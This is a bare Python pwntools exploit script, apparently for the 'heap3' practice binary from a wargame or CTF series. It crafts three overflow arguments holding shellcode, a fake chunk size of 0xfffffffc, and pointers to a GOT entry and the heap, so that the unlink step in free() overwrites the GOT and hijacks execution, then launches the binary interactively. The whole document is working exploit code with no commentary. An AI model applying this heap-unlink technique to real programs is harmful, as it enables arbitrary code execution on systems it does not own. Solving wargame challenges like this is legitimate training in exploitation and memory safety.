from pwn import *

context.clear(arch='i386')

got_addr = 0x804d024
heap_addr = 0x804e014
size_offset = 0xfffffffc
shellcode = '\xb8\x56\x88\x04\x08\xff\xd0'

arg1 = 'a'*12+shellcode
arg2 = 'b'*36+'\x65'
arg3 = 'c'*92+p32(size_offset)+p32(size_offset)+p32(got_addr-12)+p32(heap_addr)

exploit_file = open('exploit.in', 'w')
exploit_file.write(arg1)
exploit_file.write(arg2)
exploit_file.write(arg3)

p = process(['./heap3', arg1, arg2, arg3])
p.interactive()
p.corefile
